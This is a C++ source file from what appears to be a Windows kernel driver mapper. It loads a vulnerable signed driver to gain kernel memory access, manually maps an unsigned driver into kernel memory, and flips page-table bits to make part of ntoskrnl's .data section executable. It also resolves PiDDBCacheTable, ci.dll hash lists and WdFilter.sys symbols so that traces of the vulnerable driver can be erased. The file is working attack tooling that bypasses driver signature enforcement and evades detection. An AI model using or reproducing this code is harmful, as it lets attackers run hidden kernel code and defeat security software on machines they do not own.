#include "driver_mapper.hpp"
#include "memory_manager.hpp"
#include "service_manager.hpp"
#include "trace_cleaner.hpp"
#include "page_table_manager.hpp"
#include "pe_parser.hpp"
#include "utils.hpp"
#include <iostream>
#include <fstream>
#include "pdb/pdb.hpp"

// forward declarations for external NT functions
extern "C" {
NTSTATUS NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass,
                                  PVOID SystemInformation, ULONG SystemInformationLength,
                                  PULONG ReturnLength);
NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
                                 PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
NTSTATUS NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize,
                             ULONG FreeType);
NTSTATUS NtAdjustPrivilegesToken(HANDLE TokenHandle, BOOLEAN DisableAllPrivileges,
                                 PTOKEN_PRIVILEGES NewState, ULONG BufferLength,
                                 PTOKEN_PRIVILEGES PreviousState, PULONG ReturnLength);
NTSTATUS NtOpenProcessToken(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PHANDLE TokenHandle);
NTSTATUS NtClose(HANDLE Handle);
}

// RAII wrapper for local image allocation
class local_image_ptr {
  void* ptr_ = nullptr;
  SIZE_T size_ = 0;

public:
  explicit local_image_ptr(SIZE_T size) : size_(size) {
    auto status = NtAllocateVirtualMemory(GetCurrentProcess(), &ptr_, 0, &size_,
                                          MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!NT_SUCCESS(status))
      ptr_ = nullptr;
  }

  ~local_image_ptr() {
    if (ptr_) {
      SIZE_T free_size = 0;
      NtFreeVirtualMemory(GetCurrentProcess(), &ptr_, &free_size, MEM_RELEASE);
    }
  }

  local_image_ptr(const local_image_ptr&) = delete;
  local_image_ptr& operator=(const local_image_ptr&) = delete;

  void* get() const {
    return ptr_;
  }
  operator bool() const {
    return ptr_ != nullptr;
  }
};

auto driver_mapper_t::map_driver(std::vector<std::uint8_t>& driver_data, std::uint64_t param1,
                                 std::uint64_t param2, bool free_after_exec, bool destroy_headers,
                                 bool pass_alloc_address_as_first_param, NTSTATUS* exit_code,
                                 settings::driver_alloc_mode alloc_mode,
                                 settings::memory_type mem_type, settings::hide_type driver_hide,
                                 settings::hide_type dll_hide) -> std::uint64_t {
  mapper_log("INFO", "starting driver mapping process...");

  // initialize if needed
  if (!initialized_ && !initialize()) {
    mapper_log("ERROR", "failed to initialize driver mapper");
    return 0;
  }

  // validate PE image
  auto nt_headers = g_pe_parser->get_nt_headers(driver_data.data());
  if (!nt_headers || nt_headers->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
    mapper_log("ERROR", "invalid PE image or not 64-bit");
    cleanup();
    return 0;
  }

  auto image_size = nt_headers->OptionalHeader.SizeOfImage;
  auto header_size = IMAGE_FIRST_SECTION(nt_headers)->VirtualAddress;
  auto final_size = destroy_headers ? (image_size - header_size) : image_size;

  mapper_log("SUCCESS", "PE validated - size: 0x%x, header: 0x%x", image_size, header_size);

  // allocate local buffer
  local_image_ptr local_image(image_size);
  if (!local_image.get()) {
    mapper_log("ERROR", "failed to allocate local memory");
    cleanup();
    return 0;
  }

  // prepare image locally
  if (!prepare_local_image(local_image.get(), driver_data, nt_headers)) {
    mapper_log("ERROR", "failed to prepare local image");
    cleanup();
    return 0;
  }

  // allocate kernel memory
  auto kernel_base = allocate_driver_memory(final_size, alloc_mode, mem_type, destroy_headers);
  if (!kernel_base) {
    mapper_log("ERROR", "failed to allocate kernel memory");
    cleanup();
    return 0;
  }

  mapper_log("SUCCESS", "allocated kernel memory at: 0x%llx", kernel_base);

  // calculate addresses
  auto write_addr = kernel_base;
  auto entry_base = destroy_headers ? (kernel_base - header_size) : kernel_base;
  auto entry_point = entry_base + nt_headers->OptionalHeader.AddressOfEntryPoint;

  // write to kernel
  auto source = destroy_headers ? (reinterpret_cast<std::uint8_t*>(local_image.get()) + header_size)
                                : local_image.get();

  if (!g_memory_manager->write_memory(device_handle_, write_addr, source, final_size)) {
    mapper_log("ERROR", "failed to write image to kernel");
    cleanup();
    return 0;
  }

  // store mapping info
  offsets_.DriverAllocBase = entry_base;
  offsets_.DriverSize = final_size;
  offsets_.DriverHideType = static_cast<std::uint32_t>(driver_hide);
  offsets_.DllHideType = static_cast<std::uint32_t>(dll_hide);

  // call driver entry
  mapper_log("SUCCESS", "calling driver entry at: 0x%llx", entry_point);
  auto driver_status = call_driver_entry(
      entry_point, pass_alloc_address_as_first_param ? write_addr : param1, param2, false, 0);

  if (exit_code)
    *exit_code = driver_status;
  mapper_log("SUCCESS", "driver entry returned: 0x%lx", driver_status);

  // cleanup if requested
  if (free_after_exec) {
    mapper_log("SUCCESS", "freeing kernel memory");
    // TODO: Implement proper memory freeing based on alloc_mode
  }

  // final cleanup
  if (!g_service_manager->unload_vulnerable_driver(device_handle_)) {
    mapper_log("ERROR", "failed to unload vulnerable driver");
    return 0;
  }

  mapper_log("SUCCESS", "driver mapping completed successfully");
  return write_addr;
}

// helper function to prepare local image for manual mapping
auto driver_mapper_t::prepare_local_image(void* local_image,
                                          const std::vector<std::uint8_t>& driver_data,
                                          PIMAGE_NT_HEADERS64 nt_headers) -> bool {
  // zero memory
  std::memset(local_image, 0, nt_headers->OptionalHeader.SizeOfImage);

  // copy sections
  if (!copy_pe_sections(local_image, driver_data)) {
    mapper_log("ERROR", "failed to copy PE sections");
    return false;
  }

  // process relocations
  auto entry_base = reinterpret_cast<std::uint64_t>(local_image);
  if (!relocate_image(local_image, entry_base, nt_headers->OptionalHeader.ImageBase)) {
    mapper_log("ERROR", "failed to process relocations");
    return false;
  }

  // fix security cookie
  if (!fix_security_cookie(local_image, entry_base)) {
    mapper_log("ERROR", "failed to fix security cookie");
    return false;
  }

  // resolve imports
  if (!resolve_imports(local_image)) {
    mapper_log("ERROR", "failed to resolve imports");
    return false;
  }

  return true;
}

// pe section copying function
auto driver_mapper_t::copy_pe_sections(void* local_image,
                                       const std::vector<std::uint8_t>& driver_data) -> bool {
  auto nt_headers = g_pe_parser->get_nt_headers(const_cast<std::uint8_t*>(driver_data.data()));
  if (!nt_headers) {
    mapper_log("ERROR", "failed to get NT headers during section copy");
    return false;
  }

  // copy headers first
  std::memcpy(local_image, driver_data.data(), nt_headers->OptionalHeader.SizeOfHeaders);

  mapper_log("SUCCESS", "copied PE headers (0x%lx bytes)",
             nt_headers->OptionalHeader.SizeOfHeaders);

  // copy each section properly
  auto section_header = IMAGE_FIRST_SECTION(nt_headers);
  for (auto i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) {
    auto& section = section_header[i];

    // get section name for debugging
    char section_name[9] = {0};
    std::memcpy(section_name, section.Name, 8);

    mapper_log("SUCCESS", "processing section: %s (va: 0x%lx)", std::string(section_name).c_str(),
               section.VirtualAddress);

    // skip uninitialized sections (.bss, etc.)
    if (section.Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) {
      mapper_log("SUCCESS", "skipping uninitialized section: %s",
                 std::string(section_name).c_str());
      continue;
    }

    // skip sections with no raw data
    if (section.SizeOfRawData == 0) {
      mapper_log("SUCCESS", "skipping section with no raw data: %s",
                 std::string(section_name).c_str());
      continue;
    }

    // validate section bounds
    if (section.PointerToRawData >= driver_data.size() ||
        section.VirtualAddress >= nt_headers->OptionalHeader.SizeOfImage) {
      mapper_log("ERROR", "invalid section bounds for: %s", std::string(section_name).c_str());
      return false;
    }

    // calc source and destination
    auto source = driver_data.data() + section.PointerToRawData;
    auto destination = reinterpret_cast<std::uint8_t*>(local_image) + section.VirtualAddress;

    // calc copy size (minimum of raw size and virtual size)
    auto copy_size = min(section.SizeOfRawData, section.Misc.VirtualSize);

    // ensure we don't copy beyond buffer bounds
    auto remaining_file_size = driver_data.size() - section.PointerToRawData;
    auto remaining_image_size = nt_headers->OptionalHeader.SizeOfImage - section.VirtualAddress;
    copy_size = std::min<std::size_t>({copy_size, remaining_file_size, remaining_image_size});

    // copy section data
    std::memcpy(destination, source, copy_size);

    mapper_log("SUCCESS", "copied section: %s (0x%lx bytes)", std::string(section_name).c_str(),
               copy_size);
  }

  return true;
}

auto driver_mapper_t::initialize() -> bool {
  mapper_log("SUCCESS", "initializing driver mapper...");

  auto privilege_status = g_utils->check_lock_memory_privilege();
  if (!NT_SUCCESS(privilege_status)) {
    auto ensure_status = g_utils->ensure_lock_memory_privilege();
    if (!NT_SUCCESS(ensure_status)) {
      mapper_log("ERROR", "failed to set SeLockMemoryPrivilege policy, insufficient permissions");
      return false;
    }

    if (!g_utils->enable_privilege(L"SeLockMemoryPrivilege")) {
      mapper_log("ERROR", "SeLockMemoryPrivilege was added to policy but cannot be enabled in "
                          "current process. Please restart application as administrator.");
      return false;
    }

    privilege_status = g_utils->check_lock_memory_privilege();
    if (!NT_SUCCESS(privilege_status)) {
      mapper_log("ERROR", "SeLockMemoryPrivilege exists but cannot be activated. Please log off/on "
                          "or restart system.");
      return false;
    }
  }

  mapper_log("SUCCESS", "SeLockMemoryPrivilege is active");

  // init dependencies
  if (!g_utils->initialize_dependencies()) {
    mapper_log("ERROR", "failed to initialize dependencies");
    return false;
  }

  // load vulnerable driver
  device_handle_ = g_service_manager->load_vulnerable_driver();
  if (!device_handle_ || device_handle_ == INVALID_HANDLE_VALUE) {
    mapper_log("ERROR", "failed to load vulnerable driver");
    return false;
  }

  // get ntoskrnl base
  ntoskrnl_base_ = g_utils->get_kernel_module_address("ntoskrnl.exe");
  if (!ntoskrnl_base_) {
    mapper_log("ERROR", "failed to get ntoskrnl.exe base address");
    cleanup();
    return false;
  }

  // verify driver integrity
  if (!g_service_manager->verify_driver_integrity(device_handle_, ntoskrnl_base_)) {
    mapper_log("ERROR", "driver integrity check failed");
    cleanup();
    return false;
  }

  // parse PDB for offsets
  offsets_ = resolve_pdb_offsets();

  // pdb parsing usually fails when you download the symbols too many times and
  // receive a rate limit from microsoft. in this case, i just chose two random
  // offsets from each loaded pdb to compare
  if (offsets_.ExAllocatePool2 == offsets_.ExFreePoolWithTag) {
    mapper_log("ERROR", "error parsing ntoskrnl.exe symbols");
    cleanup();
    return false;
  }

  if (offsets_.g_HashCacheLock == offsets_.g_KernelHashBucketList) {
    mapper_log("ERROR", "error parsing ci.dll symbols");
    cleanup();
    return false;
  }

  if (offsets_.MpBmDocOpenRules == offsets_.MpFreeDriverInfoEx) {
    mapper_log("ERROR", "error parsing WdFilter.sys symbols");
    cleanup();
    return false;
  }

  if (!cleanup_traces(g_service_manager->get_driver_name())) {
    mapper_log("ERROR", "trace cleaning failed");
    cleanup();
    return false;
  };

  initialized_ = true;
  mapper_log("SUCCESS", "driver mapper initialized successfully");
  return true;
}

auto driver_mapper_t::cleanup() -> void {
  if (device_handle_ && device_handle_ != INVALID_HANDLE_VALUE) {
    // unload vulnerable driver
    g_service_manager->unload_vulnerable_driver(device_handle_);
    device_handle_ = INVALID_HANDLE_VALUE;
  }
  initialized_ = false;
}

auto driver_mapper_t::allocate_driver_memory(std::uint32_t image_size,
                                             settings::driver_alloc_mode alloc_mode,
                                             settings::memory_type mem_type, bool destroy_headers)
    -> std::uint64_t {
  switch (alloc_mode) {
    case settings::driver_alloc_mode::ALLOC_IN_SYSTEM_CONTEXT:
      return allocate_in_system_context(image_size);

    case settings::driver_alloc_mode::ALLOC_IN_CURRENT_PROCESS_CONTEXT:
      return allocate_in_process_context(image_size, mem_type);

    case settings::driver_alloc_mode::ALLOC_IN_NTOSKRNL_DATA_SECTION:
      return allocate_in_ntoskrnl_section(image_size);

    default:
      return 0;
  }
}

auto driver_mapper_t::allocate_in_system_context(std::uint32_t size) -> std::uint64_t {
  auto allocated = g_memory_manager->allocate_independent_pages(device_handle_, size);
  if (!allocated) {
    return 0;
  }

  // set page protection
  if (!g_memory_manager->set_page_protection(device_handle_, allocated, size,
                                             PAGE_EXECUTE_READWRITE)) {
    g_memory_manager->free_independent_pages(device_handle_, allocated, size);
    return 0;
  }

  return allocated;
}

auto driver_mapper_t::allocate_in_process_context(std::uint32_t size,
                                                  settings::memory_type mem_type) -> std::uint64_t {
  bool use_large_page = (mem_type == settings::memory_type::LARGE_PAGE ||
                         mem_type == settings::memory_type::HUGE_PAGE);

  auto allocated =
      reinterpret_cast<std::uint64_t>(g_page_table_manager->allocate_within_current_process_context(
          device_handle_, g_utils->get_current_process_id(), size, use_large_page, true));

  return allocated;
}

auto driver_mapper_t::allocate_in_ntoskrnl_section(std::uint32_t size) -> std::uint64_t {
  const auto ntos_base = ntoskrnl_base_;
  if (!ntos_base) {
    mapper_log("ERROR", "ntoskrnl base not initialized");
    return 0;
  }

  // find the .data section
  std::uint32_t section_size = 0;
  auto section_base =
      g_utils->find_kernel_section(device_handle_, ".data", ntos_base, &section_size);
  if (!section_base || !section_size) {
    mapper_log("ERROR", "failed to find .data section in ntoskrnl");
    return 0;
  }

  mapper_log("SUCCESS", "found .data section at 0x%llx with size: 0x%x", section_base,
             section_size);

  // find unused space in the section
  auto unused_space =
      g_utils->find_unused_space(device_handle_, section_base, section_size, size, 0x1000);
  if (!unused_space) {
    mapper_log("ERROR", "failed to find %u bytes of unused space in .data section", size);
    return 0;
  }

  mapper_log("SUCCESS", "found unused space at: 0x%llx", unused_space);

  // make the pages executable
  for (auto current_addr = unused_space; current_addr < unused_space + size;
       current_addr += PAGE_SIZE) {
    auto pde_address = g_page_table_manager->get_pde_address(device_handle_, current_addr);
    if (!pde_address) {
      mapper_log("ERROR", "failed to get PDE address for 0x%llx", current_addr);
      return 0;
    }

    // read the PDE
    PDE_64 pde{};
    if (!g_memory_manager->read_memory(device_handle_, pde_address, &pde, sizeof(PDE_64))) {
      mapper_log("ERROR", "failed to read PDE at 0x%llx", pde_address);
      return 0;
    }

    // check if it's a large page (2MB)
    if (pde.LargePage) {
      pde.ExecuteDisable = 0;  // allow execution
      pde.Write = 1;           // allow read/write

      if (!g_memory_manager->write_memory(device_handle_, pde_address, &pde, sizeof(PDE_64))) {
        mapper_log("ERROR", "failed to write PDE at 0x%llx", pde_address);
        return 0;
      }
    } else {
      // handle 4KB pages
      auto pte_address = g_page_table_manager->get_pte_address(device_handle_, current_addr);
      if (!pte_address) {
        mapper_log("ERROR", "failed to get PTE address for 0x%llx", current_addr);
        return 0;
      }

      PTE_64 pte{};
      if (!g_memory_manager->read_memory(device_handle_, pte_address, &pte, sizeof(PTE_64))) {
        mapper_log("ERROR", "failed to read PTE at 0x%llx", pte_address);
        return 0;
      }

      pte.ExecuteDisable = 0;  // allow execution
      pte.Write = 1;           // allow read/write

      if (!g_memory_manager->write_memory(device_handle_, pte_address, &pte, sizeof(PTE_64))) {
        mapper_log("ERROR", "failed to write PTE at 0x%llx", pte_address);
        return 0;
      }
    }
  }

  mapper_log("SUCCESS", "successfully modified page tables for executable permissions");
  return unused_space;
}

auto driver_mapper_t::relocate_image(void* local_image, std::uint64_t kernel_base,
                                     std::uint64_t original_base) -> bool {
  auto delta = kernel_base - original_base;
  return g_pe_parser->relocate_image_by_delta(local_image, delta);
}

auto driver_mapper_t::resolve_imports(void* local_image) -> bool {
  return g_pe_parser->resolve_imports(local_image, device_handle_, ntoskrnl_base_);
}

auto driver_mapper_t::fix_security_cookie(void* local_image, std::uint64_t kernel_image_base)
    -> bool {
  return g_pe_parser->fix_security_cookie(local_image, kernel_image_base);
}

auto driver_mapper_t::call_driver_entry(std::uint64_t entry_point, std::uint64_t param1,
                                        std::uint64_t param2,
                                        bool pass_alloc_address_as_first_param,
                                        std::uint64_t allocated_base) -> NTSTATUS {
  NTSTATUS result = 0;

  if (pass_alloc_address_as_first_param) {
    param1 = allocated_base;
  }

  if (!g_memory_manager->call_kernel_function(device_handle_, &result, entry_point,
                                              offsets_.IoGetCurrentProcess,
                                              offsets_.MmCopyVirtualMemory, &offsets_)) {
    return STATUS_UNSUCCESSFUL;
  }

  return result;
}

auto driver_mapper_t::get_kernel_export(const std::string& module_name,
                                        const std::string& function_name) -> std::uint64_t {
  auto module_base = g_utils->get_kernel_module_address(module_name);
  if (!module_base) {
    return 0;
  }

  return g_utils->get_kernel_module_export(device_handle_, module_base, function_name);
}

auto driver_mapper_t::get_ntoskrnl_base() -> std::uint64_t {
  return ntoskrnl_base_;
}

auto driver_mapper_t::is_vulnerable_driver_loaded() -> bool {
  return g_service_manager->is_driver_running();
}

auto driver_mapper_t::cleanup_traces(const std::string& driver_name) -> bool {
  if (!device_handle_ || device_handle_ == INVALID_HANDLE_VALUE) {
    return false;
  }

  return g_trace_cleaner->clean_all_traces(device_handle_, driver_name);
}

auto driver_mapper_t::resolve_pdb_offsets() -> pdb_offsets {
  mapper_log("INFO", "downloading required PDBs...");

  std::string kernel = std::string(std::getenv("systemroot")) + "\\System32\\ntoskrnl.exe";
  std::string pdb_path = pdb_download(kernel);
  kernel.clear();

  if (pdb_path.empty()) {
    mapper_log("ERROR", "failed to download ntoskrnl.exe PDB");
    return {};
  }

  pdb_context pdb;
  if (!pdb_load(pdb_path, &pdb)) {
    mapper_log("ERROR", "failed to load ntoskrnl.exe PDB");
    return {};
  }

  auto ntoskrnl_base = driver_mapper_t::get_ntoskrnl_base();
  auto ci_dll_base = g_utils->get_kernel_module_address("ci.dll");
  auto wdfilter_base = g_utils->get_kernel_module_address("WdFilter.sys");

  // download and load ci.dll PDB if available
  std::string ci_pdb_path;
  pdb_context ci_pdb = {};
  bool ci_pdb_loaded = false;

  if (ci_dll_base) {
    std::string ci_path = std::string(std::getenv("systemroot")) + "\\System32\\ci.dll";
    ci_pdb_path = pdb_download(ci_path);
    if (!ci_pdb_path.empty() && pdb_load(ci_pdb_path, &ci_pdb)) {
      ci_pdb_loaded = true;
      mapper_log("SUCCESS", "loaded ci.dll PDB");
    } else {
      mapper_log("ERROR", "failed to load ci.dll PDB");
      return {};
    }
  }

  // download and load WdFilter.sys PDB if available
  std::string wdfilter_pdb_path;
  pdb_context wdfilter_pdb = {};
  bool wdfilter_pdb_loaded = false;

  if (wdfilter_base) {
    std::string wdfilter_path =
        std::string(std::getenv("systemroot")) + "\\System32\\drivers\\WdFilter.sys";
    wdfilter_pdb_path = pdb_download(wdfilter_path);
    if (!wdfilter_pdb_path.empty() && pdb_load(wdfilter_pdb_path, &wdfilter_pdb)) {
      wdfilter_pdb_loaded = true;
      mapper_log("SUCCESS", "loaded WdFilter.sys PDB");
    } else {
      mapper_log("ERROR", "failed to load WdFilter.sys PDB");
      return {};
    }
  }

  driver_mapper_t::pdb_offsets offsets = {
      driver_mapper_t::get_ntoskrnl_base(),
      0,
      0,
      0,
      0,
      // memory management (Mm) functions
      ntoskrnl_base + pdb_get_rva(&pdb, "MmGetPhysicalAddress"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmPfnDatabase"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmAllocateIndependentPages"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmSetPageProtection"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmFreeIndependentPages"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmAllocateContiguousMemory"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmFreeContiguousMemory"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmCopyMemory"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmGetVirtualForPhysical"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmCopyVirtualMemory"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmMarkPhysicalMemoryAsBad"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmUserProbeAddress"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmGetSystemRoutineAddress"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmGetPhysicalMemoryRanges"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmIsAddressValid"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmAllocateSecureKernelPages"),

      // memory info (Mi) functions
      ntoskrnl_base + pdb_get_rva(&pdb, "MiGetVmAccessLoggingPartition"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiCreateDecayPfn"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiGetUltraPage"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiReservePtes"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiGetPteAddress"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiGetPdeAddress"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiSystemPartition"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiInitializePfn"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiGetPage"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiWaitForFreePage"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiRemovePhysicalMemory"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiFlushEntireTbDueToAttributeChange"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiFlushCacheRange"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiPinDriverAddressLog"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiGetPageTablePfnBuddyRaw"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiSetPageTablePfnBuddy"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiLockPageTablePage"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiAllocateLargeZeroPages"),

      // proc/obj management functions
      ntoskrnl_base + pdb_get_rva(&pdb, "PsLoadedModuleList"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsAcquireProcessExitSynchronization"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsReleaseProcessExitSynchronization"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsGetProcessExitStatus"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsSetCreateThreadNotifyRoutine"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsSetCreateProcessNotifyRoutineEx"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsLookupProcessByProcessId"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsLookupThreadByThreadId"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsGetNextProcessThread"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsSuspendThread"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsResumeThread"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsQueryThreadStartAddress"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsGetCurrentThreadId"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsGetProcessPeb"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsGetProcessImageFileName"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsGetCurrentProcess"),
      ntoskrnl_base + pdb_get_rva(&pdb, "ObfDereferenceObject"),

      // processor support functions
      ntoskrnl_base + pdb_get_rva(&pdb, "PspExitThread"),

      // executive functions
      ntoskrnl_base + pdb_get_rva(&pdb, "ExAllocatePool2"),
      ntoskrnl_base + pdb_get_rva(&pdb, "ExFreePoolWithTag"),
      ntoskrnl_base + pdb_get_rva(&pdb, "ExGetPreviousMode"),

      // kernel executive functions
      ntoskrnl_base + pdb_get_rva(&pdb, "KeBalanceSetManager"),
      ntoskrnl_base + pdb_get_rva(&pdb, "KeRaiseIrqlToDpcLevel"),
      ntoskrnl_base + pdb_get_rva(&pdb, "KzLowerIrql"),
      ntoskrnl_base + pdb_get_rva(&pdb, "KiProcessListHead"),
      ntoskrnl_base + pdb_get_rva(&pdb, "KiPageFault"),
      ntoskrnl_base + pdb_get_rva(&pdb, "KeFlushSingleTb"),
      ntoskrnl_base + pdb_get_rva(&pdb, "KeQuerySystemTimePrecise"),
      ntoskrnl_base + pdb_get_rva(&pdb, "KiKvaShadow"),
      ntoskrnl_base + pdb_get_rva(&pdb, "KeInitializeApc"),
      ntoskrnl_base + pdb_get_rva(&pdb, "KeInsertQueueApc"),
      ntoskrnl_base + pdb_get_rva(&pdb, "KeUserModeCallback"),
      ntoskrnl_base + pdb_get_rva(&pdb, "KeAlertThread"),
      ntoskrnl_base + pdb_get_rva(&pdb, "KeDelayExecutionThread"),

      // runtime library functions
      ntoskrnl_base + pdb_get_rva(&pdb, "RtlInitAnsiString"),
      ntoskrnl_base + pdb_get_rva(&pdb, "RtlInitUnicodeString"),
      ntoskrnl_base + pdb_get_rva(&pdb, "RtlAnsiStringToUnicodeString"),
      ntoskrnl_base + pdb_get_rva(&pdb, "RtlCompareUnicodeString"),
      ntoskrnl_base + pdb_get_rva(&pdb, "RtlFreeUnicodeString"),
      ntoskrnl_base + pdb_get_rva(&pdb, "RtlGetVersion"),
      ntoskrnl_base + pdb_get_rva(&pdb, "RtlCreateUserThread"),

      ntoskrnl_base + pdb_get_rva(&pdb, "ZwOpenProcess"),
      ntoskrnl_base + pdb_get_rva(&pdb, "ZwClose"),
      ntoskrnl_base + pdb_get_rva(&pdb, "ZwWaitForSingleObject"),
      ntoskrnl_base + pdb_get_rva(&pdb, "NtQueryInformationProcess"),
      ntoskrnl_base + pdb_get_rva(&pdb, "NtAlertResumeThread"),

      // debug functions
      ntoskrnl_base + pdb_get_rva(&pdb, "DbgPrint"),

      // crt functions
      ntoskrnl_base + pdb_get_rva(&pdb, "memcpy"),
      ntoskrnl_base + pdb_get_rva(&pdb, "memset"),
      ntoskrnl_base + pdb_get_rva(&pdb, "memcmp"),
      ntoskrnl_base + pdb_get_rva(&pdb, "strncmp"),
      ntoskrnl_base + pdb_get_rva(&pdb, "strlen"),
      ntoskrnl_base + pdb_get_rva(&pdb, "_wcsicmp"),
      ntoskrnl_base + pdb_get_rva(&pdb, "rand"),
      ntoskrnl_base + pdb_get_rva(&pdb, "srand"),
      ntoskrnl_base + pdb_get_rva(&pdb, "swprintf_s"),
      ntoskrnl_base + pdb_get_rva(&pdb, "_snprintf"),

      // struct offsets
      pdb_get_struct_property_offset(&pdb, "_EPROCESS", L"ActiveProcessLinks"),
      pdb_get_struct_property_offset(&pdb, "_EPROCESS", L"ThreadListHead"),
      pdb_get_struct_property_offset(&pdb, "_KPROCESS", L"ThreadListHead"),
      pdb_get_struct_property_offset(&pdb, "_EPROCESS", L"SharedCommitLinks"),
      pdb_get_struct_property_offset(&pdb, "_EPROCESS", L"SharedCommitCharge"),
      pdb_get_struct_property_offset(&pdb, "_EPROCESS", L"RundownProtect"),
      pdb_get_struct_property_offset(&pdb, "_EPROCESS", L"Vm"),
      pdb_get_struct_property_offset(&pdb, "_EPROCESS", L"Flags3"),

      // trace cleaning - ntoskrnl
      ntoskrnl_base + pdb_get_rva(&pdb, "PiDDBCacheTable"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PiDDBLock"),

      // trace cleaning - ci.dll
      ci_pdb_loaded ? (ci_dll_base + pdb_get_rva(&ci_pdb, "g_KernelHashBucketList")) : 0,
      ci_pdb_loaded ? (ci_dll_base + pdb_get_rva(&ci_pdb, "g_PEProcessHashBucketList")) : 0,
      ci_pdb_loaded ? (ci_dll_base + pdb_get_rva(&ci_pdb, "g_PEProcessList")) : 0,
      ci_pdb_loaded ? (ci_dll_base + pdb_get_rva(&ci_pdb, "g_HashCacheLock")) : 0,
      ci_pdb_loaded ? (ci_dll_base + pdb_get_rva(&ci_pdb, "g_CiEaCacheLookasideList")) : 0,
      ci_pdb_loaded ? (ci_dll_base + pdb_get_rva(&ci_pdb, "g_CiValidationLookasideList")) : 0,
      ntoskrnl_base + pdb_get_rva(&pdb, "RtlPcToFileName"),

      // trace cleaning - WdFilter.sys
      wdfilter_pdb_loaded ? (wdfilter_base + pdb_get_rva(&wdfilter_pdb, "MpBmDocOpenRules")) : 0,
      wdfilter_pdb_loaded ? (wdfilter_base + pdb_get_rva(&wdfilter_pdb, "MpFreeDriverInfoEx")) : 0,
  };

  pdb_unload(pdb_path, &pdb);

  if (ci_pdb_loaded) {
    pdb_unload(ci_pdb_path, &ci_pdb);
  }

  if (wdfilter_pdb_loaded) {
    pdb_unload(wdfilter_pdb_path, &wdfilter_pdb);
  }

  return offsets;
}

auto driver_mapper_t::get_pdb_offsets() const -> const pdb_offsets& {
  return offsets_;
}